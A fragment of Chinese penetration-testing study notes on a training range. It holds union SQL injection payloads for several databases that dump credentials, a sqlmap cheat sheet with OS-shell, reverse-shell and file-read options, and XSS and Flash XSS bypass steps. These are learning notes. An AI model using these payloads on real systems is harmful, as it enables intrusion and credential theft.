class="string">&#x27;/etc/passwd&#x27;</span>,<span class="number">1</span>,<span class="number">20</span>)	<span class="comment">#读文件前20行</span></span><br></pre></td></tr></table></figure></li>
+<li><p>实战墨者靶场：<a href="https://www.mozhe.cn/bug/detail/86">SQL手工注入漏洞测试(PostgreSQL数据库)_SQL注入_在线靶场_墨者学院_专注于网络安全人才培养 (mozhe.cn)</a></p>
+<ul>
+<li><p><a href="http://219.153.49.228:47981/new_list.php?id=1">http://219.153.49.228:47981/new_list.php?id=1</a> order by 4      字段数为4</p>
+</li>
+<li><p>查询数据库版本：<a href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,version(),null</p>
+</li>
+<li><p>查询数据库名：<a href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,current_database(),null</p>
+<ul>
+<li>得到数据库名：mozhedvcms</li>
+</ul>
+</li>
+<li><p>查询表名：<a href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,relname,null from pg_stat_user_tables</p>
+<ul>
+<li>获取到的表名 notice,这样默认获取到的是第一个表名</li>
+<li>易错点：该语句固定搭配，不需要修改</li>
+</ul>
+</li>
+<li><p>获取所有的表名：逐个获取，通过修改offset后面的数字，0，1，2，3….  获取所有的表名</p>
+<ul>
+<li><a href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,relname,null from pg_stat_user_tables limit 1 offset 0</li>
+<li>获取的表名如下：notice    reg_users   </li>
+</ul>
+</li>
+<li><p>查询列名：<a href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,column_name,null from information_schema.columns where table_name=’reg_users’               得到列：id</p>
+<ul>
+<li>易错点：该语句需要修改上一步获取到的表名 reg_users，这里默认获取到的是第一个列名</li>
+</ul>
+</li>
+<li><p>获取所有的列名：<a href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,column_name,null from information_schema.columns where table_name=’reg_users’     limit 1 offset 0</p>
+<ul>
+<li>获取到的列名：id  name  password  status</li>
+</ul>
+</li>
+<li><p>获取账号和密码：</p>
+<ul>
+<li><a href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,name,null from reg_users  获取到账号为：mozhe2</li>
+<li><a href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,password,null from reg_users获取到的密码为：1c63129ae9db9c60c3e8aa94d3e00495  解密后值为：1c63129ae9db9c60c3e8aa94d3e00495</li>
+<li><img src="/source/images/image-20210729154748904.png" alt="image-20210729154748904"></li>
+<li><img src="/source/images/image-20210729154740600.png" alt="image-20210729154740600"></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="14-、SQLite-amp-Mongodb-amp-Oracle-amp-DB2"><a href="#14-、SQLite-amp-Mongodb-amp-Oracle-amp-DB2" class="headerlink" title="14 、SQLite&amp;Mongodb&amp;Oracle&amp;DB2"></a>14 、SQLite&amp;Mongodb&amp;Oracle&amp;DB2</h2><p>#案例1-SQLite注入</p>
+<p><a href="https://www.cnblogs.com/xiaozi/p/5760321.html">https://www.cnblogs.com/xiaozi/p/5760321.html</a></p>
+<p>通常sqlite文件中会包含一个sqlite_master隐藏表</p>
+<p>​    <img src="/source/images/image-20210729164800102.png" alt="image-20210729164800102"></p>
+<p>这里记录着你建表留下的记录，我们可以查看这个表名来看这些数据，比如通过上面的图片我们可以发现存在Test表和字段id,name两个字段</p>
+<p>那么怎么查询数据呢？</p>
+<ul>
+<li>首先查询字段长度：order by 4</li>
+<li>联合查询爆出显示位   union select 1,2,3,4</li>
+<li>在显示位插入查询语句：union select 1,name,sql,4 from sqlite_master<ul>
+<li>可以看到，通过查询sqlite_master隐藏表里的字段name和sql即可获取该数据库里的表的名字Test和该Test表下的字段id，name</li>
+</ul>
+</li>
+<li>获取账号和密码：union select 1,name,password,4 from WSTMart_reg     <ul>
+<li>这里的name和password就是从sqlite_master隐藏表的字段sql里查询得到的，WSTMart_reg    则是从隐藏表sqlite_master的字段name里查到的</li>
+</ul>
+</li>
+</ul>
+<p>#案例2-DB2联合注入</p>
+<ul>
+<li>特性：和mysql大致类似，只是一些名称不一样，有一个</li>
+</ul>
+<p>tabschema：数据库名 current schema：数据库名的列名</p>
+<p>table_name：表名 tabname：表名的列名</p>
+<p>column_name：列名的列名</p>
+<p>sysibm.sysdummy1 记录数据库名的信息</p>
+<p>syscat.tables：记录表名的信息</p>
+<p>sysibm.columns：记录列名的信息</p>
+<p>1、猜数</p>
+<p>order by 4</p>
+<p>union select 1,2,3,4 from sysibm.systables</p>
+<ul>
+<li>易错点：在爆显示位的时候必须要加上后面的sysibm.systables  才能爆出显示位</li>
+</ul>
+<p>2、爆库：</p>
+<p>union select 1,2,current schema,4 from sysibm.sysdummy1</p>
+<p>3、爆表：</p>
+<p>union select 1,2,tabname,4 from syscat.tables where tabschema=current schema limit 0,1</p>
+<p>union select 1,2,tabname,4 from syscat.tables where tabschema=current schema limit 1,1</p>
+<p>4、爆列：</p>
+<p>union select 1,2,column_name,4 from sysibm.columns where table_schema=current schema and table_name=’GAME_CHARACTER’ limit 0,1</p>
+<ul>
+<li>易错点：之所以加一个将数据库名加上，就是为了防止多个数据库有相同的表名，防止数据魂断</li>
+</ul>
+<p>5、爆数据：</p>
+<p>union select 1,name,password,4 from GAME_CHARACTER limit 0,1</p>
+<p>union select 1,name,password,4 from GAME_CHARACTER limit 1,1</p>
+<ul>
+<li>查询表GAME_CHARACTER里的账号和密码</li>
+</ul>
+<p>#案例3-Oracle联合注入</p>
+<p><a href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">https://www.cnblogs.com/peterpan0707007/p/8242119.html</a></p>
+<p><a href="https://blog.csdn.net/qq_35569814/article/details/100517122">https://blog.csdn.net/qq_35569814/article/details/100517122</a></p>
+<p>all_tables 查询出所有的表</p>
+<p>user_tables 查询出当前用户的表</p>
+<p>all_tab_columns 查询出所有的字段</p>
+<p>user_tab_columns  查询出当前用户的字段</p>
+<p>v$version 查版本</p>
+<p>1.查询个数</p>
+<p>order by 2</p>
+<p>2.查询表名格式</p>
+<ul>
+<li>易错点：<ul>
+<li>可以是数字1,2,3等，也可以是null</li>
+<li>需要先判断null是数字类型还是字符类型<ul>
+<li>首先将第一个null用单引号引起来，’null’，如果页面正常，则是字符型，如果页面错误，则是数字型</li>
+<li>如果第一个null是字符型<ul>
+<li>那么就开始测第二个null，同时第一个null还是用单引号引起来’null’，在测第二个null，将第二个null用单引号引起来，看他是不是字符型，如果是，则继续用单引号引起来，以此类推<ul>
+<li>union select ‘null’,’null’ from dual    此处如果页面正常，那么两个null都是字符型，必须都要用单引号引起来</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>如果第一个null是数字型<ul>
+<li>那么第一个null则不需要单引号，开始测第二个null，首先加单引号，如果页面正常，则第二个null要用单引号引起来，则最终的语句是：union select null,’null’ from dual</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>union select null,null from dual    #两个null都是数字型</p>
+<p>union select ‘null’,null from dual   #第一个null是字符型，第二个null是数字型</p>
+<p>union select ‘null’,’null’ from dual    #两个null都是数字型</p>
+<p>3.查询获取表名(筛选,搜索)</p>
+<p>union select ‘1’,(select table_name from user_tables where rownum=1) from dual</p>
+<ul>
+<li>获取表名</li>
+</ul>
+<p>union select ‘1’,(select table_name from user_tables where rownum=1 and table_name not in ‘LOGMNR_SESSION_EVOLVE$’) from dual</p>
+<ul>
+<li>获取和第一个表不一样的表名，通过and 和not in来逐个爆出来</li>
+</ul>
+<p>union select ‘1’,(select table_name from user_tables where rownum=1 and table_name like ‘%user%’) from dual</p>
+<ul>
+<li>获取表名，并且该表名里有关键字：user</li>
+</ul>
+<p>4.查询获取列名</p>
+<p>union select ‘1’,(select column_name from user_tab_columns where rownum=1 and table_name=’sns_users’) from dual</p>
+<ul>
+<li>获取表sns_user所对应的字段</li>
+</ul>
+<p>union select ‘1’,(select column_name from user_tab_columns where rownum=1 and table_name=’sns_users’ and column_name not in ‘USER_NAME’)  from dual</p>
+<ul>
+<li>获取表sns_user所对应的字段，并且该字段能是上一个句子爆出来的字段，通过此方法遍历所有的字段</li>
+</ul>
+<p>5.获取指定表名列名数据</p>
+<p>union select user_name,user_pwd from “sns_users”</p>
+<ul>
+<li>获取账号和密码，假设获取到的账号为  hu</li>
+</ul>
+<p>union select user_name,user_pwd from “sns_users” where user_name&lt;&gt;’hu’</p>
+<ul>
+<li>获取账号不为 hu  的其余的账号和密码，   &lt;&gt;   的意思是不等于的意思</li>
+</ul>
+<p>union select user_name,user_pwd from “sns_users” where user_name=’mozhe’</p>
+<ul>
+<li>获取账号为 mozhe的的密码</li>
+</ul>
+<p>#案例4-Mongodb闭合注入</p>
+<ul>
+<li><p>应用场景：一般应用于ctf或者python开发的web环境中</p>
+</li>
+<li><p>特性：返回的是json的格式,sqlmap不支持该数据库</p>
+</li>
+<li><p>注入步骤</p>
+<p>1.获取回显数字</p>
+<p>‘}); return ({title:1,content:’2</p>
+<ul>
+<li><p>因为Mongodb和其他数据库的格式不一样，需要闭合</p>
+<ul>
+<li><p>如果不闭合，我们的语句会被当做字符串</p>
+<ul>
+<li><img src="/source/images/image-20210729174705548.png" alt="image-20210729174705548"></li>
+</ul>
+</li>
+<li><p>闭合后的效果：</p>
+<ul>
+<li><img src="/source/images/image-20210729174730745.png" alt="image-20210729174730745"></li>
+</ul>
+</li>
+<li><p>查询语句只需要插在回显位置即可，比如上图中的回显位置就在1那里</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>2.爆库</p>
+<p>db返回的是数组，库名，需要用tojson转换为字符串</p>
+<p>‘}); return ({title:tojson(db),content:’2</p>
+<ul>
+<li>查询数据库名</li>
+</ul>
+<p>3.爆表</p>
+<p>db.getCollectionNames()返回的是数组，需要用tojson转换为字符串</p>
+<p>‘}); return ({title:tojson(db.getCollectionNames()),content:’2</p>
+<ul>
+<li>db.getCollectionNames()代表获取该数据库的所有表，这里获取到的是Authority_confidential表</li>
+</ul>
+<p>4.爆列及数据</p>
+<p>db.Authority_confidential是当前用的集合（表），</p>
+<p>find函数用于查询，0是第一条数据</p>
+<p>‘}); return ({title:tojson(db.Authority_confidential.find()[0]),content:’1</p>
+<ul>
+<li>获取当前数据库的Authority_confidential表的字段，查找第一个字段，find()[0]</li>
+</ul>
+<p>‘}); return ({title:tojson(db.Authority_confidential.find()[1]),content:’1</p>
+<ul>
+<li>获取当前数据库的Authority_confidential表的字段，查找第2个字段，find()[1]</li>
+</ul>
+</li>
+</ul>
+<h2 id="15-、Sybase-amp-Mssql-amp-Sqlmap-amp-Tamper"><a href="#15-、Sybase-amp-Mssql-amp-Sqlmap-amp-Tamper" class="headerlink" title="15 、Sybase&amp;Mssql&amp;Sqlmap&amp;Tamper"></a>15 、Sybase&amp;Mssql&amp;Sqlmap&amp;Tamper</h2><p>案例1-SQL注入-Sybase手工联合注入</p>
+<ul>
+<li>```python<br>1.猜个数<br>order by 4<br>2.猜显位:从第一个null开始给他用单引号引起来，如果显示正常，则代表第一个null是显示位，如果不正常，那么去掉第一个null的单引号，将第二个null引起来，然后观察页面是否正常，依此类推。。。<br>注意事项：<pre><code>1、整个union语句中，只能存在一个被单引号引起来的null
+2、union和select之间有一个all，千万不能少
+</code></pre>
+union all select ‘null’,null,null,null<br>union all select null,’null’,null,null 显示null证明显示位为2<br>union all select null,null,’null’,null<br>union all select null,null,null,’null’<br>3.猜库名<br>union all select null,db_name(),null,null<br>union all select null,db_name(1),null,null<br>union all select null,db_name(2),null,null<br>4.猜表名：这里的mozhe_Deepthroat是上一步获取到的数据库名，而  .dbo.sysobjects 是固定搭配，这里面储存着所有的表<br>union all select null,name,null,null from mozhe_Deepthroat.dbo.sysobjects<br>union all select null,name,null,null from mozhe_Deepthroat.dbo.sysobjects where name&lt;&gt;’Deepthroat_login’<br>union all select null,name,null,null from mozhe_Deepthroat.dbo.sysobjects where name&lt;&gt;’Deepthroat_login’ and name&lt;&gt;’notice’<br>5.猜列名：注意，才列名的时候，填充在null的位置的关键字也是name，而 .dbo.syscolumns 里储存了所有的列<br>union all select null,name,null,null from mozhe_Deepthroat.dbo.syscolumns where id=object_id(‘Deepthroat_login’)  #此处是通过id=object_id(‘Deepthroat_login’) 来对条件进行限定，就是只获取表Deepthroat_login里的列<br>union all select null,name,null,null from mozhe_Deepthroat.syscolumns where id=object_id(‘Deepthroat_login’) and name&lt;&gt;’id’<br>union all select null,name,null,null from mozhe_Deepthroat.syscolumns where id=object_id(‘Deepthroat_login’) and name&lt;&gt;’id’ and name&lt;&gt;’name’    #这里的  &lt;&gt;代表不等于，表示获取表Deepthroat_login里的字段，并且要求该字段不为 id 和 name<br>6.获取数据<br>union all select null,name,null,null from Deepthroat_login    #此处的name是上一步获取到的字段 name<br>union all select null,password,null,null from Deepthroat_login<br>union all select null,password,null,null from Deepthroat_login where name&lt;&gt;’zhang’   #获取除了账号zhang之外的密码<br>union all select null,password,null,null from Deepthroat_login where name=’mozhe’<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例2-SQLMAP-下载&amp;安装&amp;使用&amp;说明</span><br><span class="line"></span><br><span class="line">https://www.python.org/downloads/</span><br><span class="line"></span><br><span class="line">https://github.com/sqlmapproject/sqlmap</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/qq_21500173/article/details/53648696</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例3-SQLMAP-Sybase&amp;Mysql&amp;SQLite</span><br><span class="line"></span><br><span class="line">sqlmap基础命令讲解：</span><br><span class="line"></span><br><span class="line">- 易错点：如果在用sqlmap注入一个网站，发现换了一个目标识别出了数据库名字，并且该名字和上一次的结果一样，但是当执行--tables的时候又是500错误，那么可能就是缓存的原因了，需要删除缓存再开始注入，缓存文件地址：C:\Users\painter\AppData\Local\sqlmap\output     直接将output目录下的文件夹删除即可</span><br><span class="line">  - ![image-20210730112640774](/source/images/image-20210730112640774.png)</span><br><span class="line"></span><br><span class="line">- </span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">	#SQLMAP基本操作笔记：</span><br><span class="line">-u  #注入点 </span><br><span class="line">-f  #指纹判别数据库类型 </span><br><span class="line">-b  #获取数据库版本信息 </span><br><span class="line">-p  #指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;) </span><br><span class="line">-D &quot;&quot;  #指定数据库名 </span><br><span class="line">-T &quot;&quot;  #指定表名 </span><br><span class="line">-C &quot;&quot;  #指定字段 </span><br><span class="line">-s &quot;&quot;  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot;　　恢复:-s &quot;xx.log&quot; --resume) </span><br><span class="line">--level=(1-5) #要执行的测试水平等级，默认为1 </span><br><span class="line">--risk=(0-3)  #测试执行的风险等级，默认为1 </span><br><span class="line">--time-sec=(2,5) #延迟响应，默认为5 </span><br><span class="line">--data #通过POST发送数据 </span><br><span class="line">--columns        #列出字段 </span><br><span class="line">--current-user   #获取当前用户名称 </span><br><span class="line">--current-db     #获取当前数据库名称 </span><br><span class="line">--users          #列数据库所有用户 </span><br><span class="line">--passwords      #数据库用户所有密码 </span><br><span class="line">--privileges     #查看用户权限(--privileges -U root) </span><br><span class="line">-U               #指定数据库用户 </span><br><span class="line">--dbs            #列出所有数据库 </span><br><span class="line">--tables -D &quot;&quot;   #列出指定数据库中的表 </span><br><span class="line">--columns -T &quot;user&quot; -D &quot;mysql&quot;#列出mysql数据库中的user表的所有字段</span><br><span class="line">--dump-all            #列出所有数据库所有表 </span><br><span class="line">--exclude-sysdbs      #只列出用户自己新建的数据库和表 </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 </span><br><span class="line">--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </span><br><span class="line">--os      #指定系统(Linux,Windows) </span><br><span class="line">-v  #详细的等级(0-6)     0：只显示Python的回溯，错误和关键消息。 </span><br><span class="line">    1：显示信息和警告消息。 </span><br><span class="line">    2：显示调试消息。 </span><br><span class="line">    3：有效载荷注入。 </span><br><span class="line">    4：显示HTTP请求。 </span><br><span class="line">    5：显示HTTP响应头。 </span><br><span class="line">    6：显示HTTP响应页面的内容 </span><br><span class="line">--privileges  #查看权限 </span><br><span class="line">--is-dba      #是否是数据库管理员 </span><br><span class="line">--roles       #枚举数据库用户角色 </span><br><span class="line">--udf-inject  #导入用户自定义函数（获取系统权限） </span><br><span class="line">--union-check  #是否支持union 注入 </span><br><span class="line">--union-cols #union 查询表记录 </span><br><span class="line">--union-test #union 语句测试 </span><br><span class="line">--union-use  #采用union 注入 </span><br><span class="line">--union-tech orderby #union配合order by </span><br><span class="line">--data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;) </span><br><span class="line">--cookie &quot;用;号分开&quot;      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) --referer &quot;&quot;     #使用referer欺骗(--referer &quot;http://&quot;) </span><br><span class="line">--user-agent &quot;&quot;  #自定义user-agent </span><br><span class="line">--proxy &quot;http://127.0.0.1:8118&quot; #代理注入 </span><br><span class="line">--string=&quot;&quot;    #指定关键词,字符串匹配. </span><br><span class="line">--threads 　　  #采用多线程(--threads 3) </span><br><span class="line">--sql-shell    #执行指定sql命令 </span><br><span class="line">--sql-query    #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) </span><br><span class="line">--file-read    #读取指定文件 </span><br><span class="line">--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) </span><br><span class="line">--file-dest    #要写入的文件绝对路径 </span><br><span class="line">--os-cmd=id    #执行系统命令 </span><br><span class="line">--os-shell     #系统交互shell </span><br><span class="line">--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) </span><br><span class="line">--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) </span><br><span class="line">--os-smbrelay  # </span><br><span class="line">--os-bof       # </span><br><span class="line">--reg-read     #读取win系统注册表 </span><br><span class="line">--priv-esc     # </span><br><span class="line">--time-sec=    #延迟设置 默认--time-sec=5 为5秒 -p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #指定user-agent注入 </span><br><span class="line">--eta          #盲注 /pentest/database/sqlmap/txt/common-columns.txt　　字段字典　　　 </span><br><span class="line">common-outputs.txt </span><br><span class="line">common-tables.txt      表字典 </span><br><span class="line">keywords.txt </span><br><span class="line">oracle-default-passwords.txt </span><br><span class="line">user-agents.txt </span><br><span class="line">wordlist.txt </span><br><span class="line">常用语句 :</span><br><span class="line">1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 </span><br><span class="line">2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 </span><br><span class="line">3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 </span><br><span class="line">4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C &quot;user,pass&quot;  -v 1 --exclude-sysdbs </span><br><span class="line">5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 </span><br><span class="line">6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read &quot;c:\boot.ini&quot; -v 2 </span><br><span class="line">7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 </span><br><span class="line">8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd &quot;id&quot; -v 1 </span><br><span class="line">9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 </span><br><span class="line">10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 </span><br><span class="line">11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 </span><br><span class="line">12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 </span><br><span class="line">13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 </span><br><span class="line">14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta </span><br><span class="line">15./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;&#x27;)&quot; --suffix &quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;16./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;17./sqlmap.py -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;18./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 </span><br><span class="line">19./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --sql-query &quot;SELECT &#x27;foo&#x27;&quot; -v 1 </span><br><span class="line">20./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --common-tables -D testdb --banner </span><br><span class="line">21./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --cookie=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot; --string=&#x27;xx&#x27; --dbs --level=3 -p &quot;uid&quot;简单的注入流程 :</span><br><span class="line">1.读取数据库版本，当前用户，当前数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 </span><br><span class="line">2.判断当前数据库用户权限 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 </span><br><span class="line">3.读取所有数据库用户或指定数据库用户的密码 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 </span><br><span class="line">4.获取所有数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 </span><br><span class="line">5.获取指定数据库中的所有表 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 </span><br><span class="line">6.获取指定数据库名中指定表的字段 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 </span><br><span class="line">7.获取指定数据库名中指定表中指定字段的数据 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 </span><br><span class="line">8.file-read读取web文件 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 </span><br><span class="line">9.file-write写入文件到web </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ul>
+<ul>
+<li><pre><code class="python">Sqlmap-Sybase 注入
+--dbs       #获取所有数据库名                    
+--current-db    #获取当前数据库
+--tables -D &quot;mozhe_Deepthroat&quot;     #跑表
+--columns -D &quot;mozhe_Deepthroat&quot; -T Deepthroat_login   #跑字段
+--dump -C &quot;name,password&quot; -D &quot;mozhe_Deepthroat&quot; -T Deepthroat_login     #获取数据
+Sqlmap-Mysql
+--dbs                        
+--current-db                                            
+--tables -D mozhe_Discuz_StormGroup
+--columns -T StormGroup_member -D mozhe_Discuz_StormGroup
+--dump -C &quot;name,password&quot; -T StormGroup_member -D mozhe_Discuz_StormGroup
+
+Sqlmap-SQLite
+#注意事项：因为sqlite只有一个数据库，所以直接开始获取tables即可
+--tables
+--columns -T WSTMart_reg
+--dump -C &quot;name,password&quot; -T WSTMart_reg
+</code></pre>
+</li>
+</ul>
+<p>#案例4-引出实战-编码性注入手工及工具测试</p>
+<p>手工：</p>
+<ul>
+<li>首先要对加密的参数进行解密</li>
+<li>再解密后的参数的值后面拼接sql语句</li>
+<li>接着对拼接的sql语句进行加密</li>
+<li>将加密后的语句拼接到url里进行执行</li>
+</ul>
+<p>工具：</p>
+<ul>
+<li>python sqlmap.py -u “<a href="http://xxxx/?id=*&quot;">http://xxxx?id=*&quot;</a> –tamper=base64encode.py</li>
+</ul>
+<p>sqlmap的目录结构</p>
+<ul>
+<li><a href="https://blog.csdn.net/qq_21500173/article/details/53648696">sqlmap 的源码学习笔记一之目录结构_这块盾牌有待改良-CSDN博客</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>26-30、渗透测试(xiaodi)</title>
+    <url>/2021/08/10/26-30%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/</url>
+    <content><![CDATA[<p>26、Flashxss&amp;mxss&amp;uxss&amp;FuzzBypass</p>
+<p>1、mxss&amp;uxss&amp;flashxss</p>
+<p>2、XSS代码层防护及绕过思路</p>
+<ul>
+<li>防护的分类<ul>
+<li>代码层面<ul>
+<li>限制输入长度    <ul>
+<li>可以通过修改length的数值来绕过</li>
+</ul>
+</li>
+<li>关键字过滤<ul>
+<li>换其它关键字、使用标签绕过</li>
+</ul>
+</li>
+<li>将尖括号实体化<ul>
+<li>使用事件</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>用户的设置</li>
+<li>waf防护</li>
+</ul>
+</li>
+</ul>
+<span id="more"></span>
+
+<p>3、XSS手工及项目检测bypass</p>
+<p>#案例1-mxss&amp;uxss案例分析</p>
+<ul>
+<li>xss入门与介绍：<ul>
+<li><a href="https://www.fooying.com/the-art-of-xss-1-introduction/">https://www.fooying.com/the-art-of-xss-1-introduction/</a></li>
+</ul>
+</li>
+<li>mxss<ul>
+<li>特点：比较鸡肋，应用的场景少</li>
+<li>定义：我们在一个地方拆入xss，但是被过滤了，导致无危害，但是如果我们将该文章分享到qq或者等其他地方，并且这些平台会对我们的分享的文章产生预览功能，这样的话可能会导致mxss</li>
+<li>漏洞场景<ul>
+<li>低版本的pc的qq以前存在mxss，新版本的qq只对比较大和信任的网站提供预览功能，比如新浪或者其他的，但是我们在新浪或者其他平台很少有发表信息的权限</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>uxss<ul>
+<li>定义：<ul>
+<li>利用的是浏览器或者浏览器插件本身的漏洞，这种漏洞只有很牛逼的大佬才能挖到，挖到一个可能就几万美元了</li>
+</ul>
+</li>
+<li>uxss和普通xss的区别<ul>
+<li>普通xss因为浏览器同源策略的原因，只能获取到某个网站的cookie，但是uxss是从浏览器本身出发，所以可以获取到该浏览器里的所有网站的cookie，甚至可以调用windows里的其它程序</li>
+</ul>
+</li>
+<li>案例：搜狗浏览器uxss：只要通过搜狗浏览器访问一个网站，就能执行特定的程序，比如计算机<ul>
+<li>​                 <img src="https://docimg3.docs.qq.com/image/he4hu1DXFKD8iZPI45bgsw?w=1024&h=686?type=image/gif" alt="img">        </li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>#案例2-flashxss案例分析实际利用</p>
+<ul>
+<li>```<br>谷歌搜索语法：filetype:swf inurl:xml意义：flash会加载一个远程的资源，而该资源的后缀就是xml，我们只需要将它加载的远程的xml换成我们自己构造的远程xml文件即可，同时在该xml文件里的开头的link处插入xss攻击代码攻击流程：    1、下载目标网站的xml，修改xml，将开头的link处修改为xss攻击代码    2、将修改后的xml放入自己的网站中    3、在xml的当前目录创建一个Crossdomain.xml   该文件的作用是给目标网站对我们修改的xml文件的访问权限，Crossdomain.xml的代码如下<?xml version="1.0"?><cross-domain-policy>    <allow-access-from domain="*.xxx.xxx" /></cross-domain-policy>    4、将目标网站的url里的xml链接替换为我们自己的服务器上的xml链接，然后访问即可<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">\</span><br><span class="line"></span><br><span class="line">#案例3-绕过代码层过滤分析bypass</span><br><span class="line"></span><br><span class="line">- 参考链接</span><br><span class="line"></span><br><span class="line">  - xss靶场：https://github.com/do0dl3/xss-labs</span><br><span class="line">  - xss小结：https://xz.aliyun.com/t/2936</span><br><span class="line"></span><br><span class="line">- 绕过方法</span><br><span class="line"></span><br><span 